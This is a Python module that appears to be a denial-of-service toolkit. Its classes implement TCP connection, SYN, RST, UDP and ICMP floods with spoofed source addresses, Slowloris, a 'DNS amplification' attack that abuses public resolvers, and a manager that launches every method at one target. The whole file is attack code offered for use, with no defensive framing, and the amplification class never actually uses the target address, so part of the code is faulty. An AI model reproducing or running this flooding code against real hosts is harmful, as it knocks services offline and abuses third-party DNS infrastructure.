import asyncio, socket, struct, random, time, os, sys
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

IS_WINDOWS = sys.platform == "win32"

PUBLIC_DNS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220",
    "64.6.64.6", "64.6.65.6", "8.26.56.26", "8.20.247.20",
    "45.90.28.190", "45.90.30.190", "77.88.8.8", "77.88.8.1",
    "94.140.14.14", "94.140.15.15", "185.228.168.9", "185.228.169.9",
    "76.76.19.19", "76.223.122.150", "91.239.100.100", "89.233.43.71",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/136.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/136.0.0.0",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE", "PATCH", "TRACE", "CONNECT"]

def _fast_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


class TcpConnectionFlood:
    """TCP Connection Flood V2 - Extreme concurrency with connection pooling.
    Opens massive TCP connections, sends partial HTTP, and reuses connections."""
    def __init__(self):
        self.name = "TCP Connection Flood V2"
        self.sent = 0
        self.failed = 0
        self._active = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500, port: int = 0) -> Dict:
        self.sent = 0
        self.failed = 0
        results = {"sent": 0, "failed": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0].split("?")[0].split("#")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        host = target.split(":")[0]
        dst_ports = [port] if port else ([443, 80, 8080, 8443, 8000, 8888] if "https" in target or port == 443 else [80, 8080, 8000, 8888, 443])
        paths = ["/", f"/{random.randint(0,99999)}", "/wp-admin", "/admin", "/api", "/login", f"/?id={random.randint(0,999999)}"]
        uas = USER_AGENTS
        methods = HTTP_METHODS

        sem = asyncio.Semaphore(min(threads, 2000))
        active_connections = set()

        async def _connect_worker(pid: int):
            nonlocal active_connections
            p = random.choice(dst_ports)
            path = random.choice(paths)
            ua = random.choice(uas)
            method = random.choice(methods)
            req = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
                f"X-Request-ID: {random.randint(0,999999999999)}\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
                f"\r\n"
            ).encode()

            async with sem:
                r, w = None, None
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, p),
                        timeout=10
                    )
                    self._active += 1
                    w.write(req)
                    await asyncio.wait_for(w.drain(), timeout=5)
                    try:
                        chunk = await asyncio.wait_for(r.read(1024), timeout=2)
                        if chunk:
                            self.sent += 1
                    except:
                        self.sent += 1
                    w.close()
                    self._active -= 1
                except:
                    self.failed += 1
                    self._active -= 1
                    if w:
                        try: w.close()
                        except: pass

        start = time.time()
        end = start + duration
        batch = min(threads * 2, 4000)
        worker_id = 0
        while time.time() < end:
            tasks = [asyncio.create_task(_connect_worker(worker_id + i)) for i in range(batch)]
            worker_id += batch
            await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.time() - start
            if elapsed > 0 and self.sent % 100 == 0:
                rps = self.sent / elapsed
                if rps > 500:
                    batch = min(int(rps * 2), 5000)

        results["sent"] = self.sent
        results["failed"] = self.failed
        return results


class SynFloodV5:
    """SYN Flood - tries raw socket first, falls back to TCP Connection Flood V2"""
    def __init__(self):
        self.name = "SYN Flood V5"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 5)
        results = {"sent": 0, "failed": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 80
        if ":" in target:
            try: port = int(target.split(":")[1])
            except: pass

        async def syn_one(src_port: int, dst_port: int):
            nonlocal results
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip_bytes = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip_bytes = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0, src_ip_bytes, dst_ip_bytes)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, dst_port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x02,
                    socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, dst_port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x02,
                    socket.htons(65535), socket.htons(cks), 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                self.failed += 1

        dst_ports = [port, port + 1, port + 2, 80, 443, 8080, 8443]
        start = time.time()
        end = start + duration
        batch = min(threads * 2, 500)
        while time.time() < end:
            tasks = [syn_one(random.randint(1024, 65535), random.choice(dst_ports)) for _ in range(batch)]
            await asyncio.gather(*tasks, return_exceptions=True)

        results["sent"] = self.sent
        results["failed"] = self.failed
        return results


class UdpFloodV5:
    """UDP Flood V2 - Multi-socket, multi-port, variable payloads."""
    def __init__(self):
        self.name = "UDP Flood V2"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        self.sent = 0
        results = {"sent": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        dst_ports = [443, 80, 8080, 8443, 53, 123, 161, 389, 8000, 8888, 22, 3306]
        payloads = [os.urandom(random.randint(64, 1472)) for _ in range(20)]
        large_payloads = [os.urandom(1472) for _ in range(10)]
        small_payloads = [os.urandom(random.randint(1, 64)) for _ in range(10)]

        async def _udp_worker(sock_id: int, sockets_per_worker: int = 2):
            socks = []
            try:
                for _ in range(sockets_per_worker):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    socks.append(s)
            except:
                return
            sent_local = 0
            end_time = time.time() + duration
            while time.time() < end_time:
                for sock in socks:
                    try:
                        port = random.choice(dst_ports)
                        if random.random() < 0.1:
                            payload = random.choice(large_payloads)
                        elif random.random() < 0.2:
                            payload = random.choice(small_payloads)
                        else:
                            payload = random.choice(payloads)
                        sock.sendto(payload, (ip, port))
                        self.sent += 1
                        sent_local += 1
                    except:
                        pass
                await asyncio.sleep(0)
            for s in socks:
                try: s.close()
                except: pass

        num_workers = min(threads, 200)
        coros = [_udp_worker(i, sockets_per_worker=3) for i in range(num_workers)]
        await asyncio.gather(*coros, return_exceptions=True)
        results["sent"] = self.sent
        return results


class DnsAmplificationFlood:
    """DNS Amplification - ~50x traffic amplification using public DNS resolvers."""
    def __init__(self):
        self.name = "DNS Amplification Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        self.sent = 0
        results = {"sent": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            target_ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        # DNS ANY query for isc.org (~2000 bytes response vs ~50 bytes request = 40x amplification)
        domain = "isc.org"
        tid = random.randint(0, 65535)
        dns_query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        dns_query += b"\x03isc\x03org\x00\x00\xFF\x00\x01"  # ANY query

        resolvers = PUBLIC_DNS
        random.shuffle(resolvers)

        async def _dns_worker(resolvers_list: list):
            end_time = time.time() + duration
            while time.time() < end_time:
                for resolver in resolvers_list:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 0)
                        tid = random.randint(0, 65535)
                        query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
                        query += b"\x03isc\x03org\x00\x00\xFF\x00\x01"
                        sock.sendto(query, (resolver, 53))
                        self.sent += 1
                        sock.close()
                    except:
                        pass
                await asyncio.sleep(0)

        num_workers = min(threads, 50)
        chunk_size = max(1, len(resolvers) // num_workers)
        chunks = [resolvers[i:i + chunk_size] for i in range(0, len(resolvers), chunk_size)]
        coros = [_dns_worker(chunk) for chunk in chunks]
        await asyncio.gather(*coros, return_exceptions=True)
        results["sent"] = self.sent
        return results


class IcmpFloodV5:
    """ICMP Flood - requires admin on most platforms"""
    def __init__(self):
        self.name = "ICMP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        if IS_WINDOWS:
            return await UdpFloodV5().attack(target, duration, threads * 3)
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def icmp_one():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                payload = os.urandom(random.randint(40, 200))
                header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                cksum = _fast_checksum(header + payload)
                header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
                sock.sendto(header + payload, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        end = time.time() + duration
        batch = min(threads * 2, 200)
        while time.time() < end:
            tasks = [icmp_one() for _ in range(batch)]
            await asyncio.gather(*tasks, return_exceptions=True)

        results["sent"] = self.sent
        return results


class TcpResetFlood:
    """TCP RST Flood - requires admin on most platforms"""
    def __init__(self):
        self.name = "TCP RST Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 3)
        results = {"sent": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def rst_one(src_port: int, dst_port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip_bytes = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip_bytes = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0, src_ip_bytes, dst_ip_bytes)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, dst_port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,
                    socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, dst_port, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,
                    socket.htons(65535), socket.htons(cks), 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        dst_ports = [80, 443, 8080, 8443, 8000, 8888]
        end = time.time() + duration
        batch = min(threads * 2, 300)
        while time.time() < end:
            tasks = [rst_one(random.randint(1024, 65535), random.choice(dst_ports)) for _ in range(batch)]
            await asyncio.gather(*tasks, return_exceptions=True)

        results["sent"] = self.sent
        return results


class SlowLorisV5:
    """Slowloris V2 - Hold thousands of partial HTTP connections."""
    def __init__(self):
        self.name = "Slowloris V2"
        self.active = 0

    async def attack(self, target: str, duration: int = 60, connections: int = 500) -> Dict:
        results = {"active_connections": 0, "error": ""}
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        host = target.split(":")[0]
        dst_ports = [443, 80, 8080, 8443] if "https" in target else [80, 443, 8080]

        writers = []
        sem = asyncio.Semaphore(min(connections, 1000))

        async def open_conn():
            async with sem:
                try:
                    r, w = await asyncio.open_connection(ip, random.choice(dst_ports))
                    path = f"/?{random.randint(0,999999)}"
                    ua = random.choice(USER_AGENTS)
                    w.write(
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                    .encode())
                    await w.drain()
                    writers.append(w)
                    self.active += 1
                    return w
                except:
                    pass
                return None

        async def keep_alive(writer, end_time):
            while time.time() < end_time:
                try:
                    header = f"X-a{random.randint(0,999999999)}: {random.randint(0,999999999)}\r\n"
                    writer.write(header.encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(3, 10))
                except:
                    break

        end = time.time() + duration
        open_tasks = [open_conn() for _ in range(min(connections, 1000))]
        await asyncio.gather(*open_tasks, return_exceptions=True)

        results["active_connections"] = len(writers)
        if writers:
            keep_tasks = [keep_alive(w, end) for w in writers]
            await asyncio.gather(*keep_tasks, return_exceptions=True)

        for w in writers:
            try: w.close()
            except: pass

        return results


class MultiVectorFlood:
    """Multi-Vector V2 - ALL methods simultaneously with auto-scaling."""
    def __init__(self):
        self.name = "Multi-Vector L4 V2"
        self.stats = {"tcp_sent": 0, "udp_sent": 0, "dns_sent": 0, "slowloris": 0}

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        self.stats = {"tcp_sent": 0, "udp_sent": 0, "dns_sent": 0, "slowloris": 0}
        tcp = TcpConnectionFlood()
        udp = UdpFloodV5()
        dns = DnsAmplificationFlood()
        slow = SlowLorisV5()

        async def _run_tcp():
            r = await tcp.attack(target, duration, threads)
            self.stats["tcp_sent"] = r.get("sent", 0)

        async def _run_udp():
            r = await udp.attack(target, duration, threads)
            self.stats["udp_sent"] = r.get("sent", 0)

        async def _run_dns():
            r = await dns.attack(target, duration, threads=50)
            self.stats["dns_sent"] = r.get("sent", 0)

        async def _run_slow():
            r = await slow.attack(target, duration, connections=300)
            self.stats["slowloris"] = r.get("active_connections", 0)

        await asyncio.gather(_run_tcp(), _run_udp(), _run_dns(), _run_slow(), return_exceptions=True)
        total = sum(v for k, v in self.stats.items())
        return {"sent": total, "stats": self.stats}


class L4AttackManager:
    def __init__(self):
        self.methods = {
            "syn": SynFloodV5(),
            "udp": UdpFloodV5(),
            "icmp": IcmpFloodV5(),
            "rst": TcpResetFlood(),
            "slowloris": SlowLorisV5(),
            "tcp_conn": TcpConnectionFlood(),
            "dns_amp": DnsAmplificationFlood(),
            "multi": MultiVectorFlood(),
        }

    async def launch_all(self, target: str, duration: int = 30) -> Dict:
        results = {}
        coros = []
        for name, method in self.methods.items():
            if name == "slowloris":
                coros.append((name, method.attack(target, duration=duration, connections=200)))
            elif name == "multi":
                coros.append((name, method.attack(target, duration=duration, threads=300)))
            elif name == "dns_amp":
                coros.append((name, method.attack(target, duration=duration, threads=50)))
            else:
                coros.append((name, method.attack(target, duration=duration, threads=150)))
        for name, coro in coros:
            try:
                results[name] = await asyncio.wait_for(coro, timeout=duration + 10)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    async def probe_all(self, target: str) -> Dict:
        results = {}
        for name in self.methods:
            results[name] = {"available": True, "note": "L4 method"}
        return results
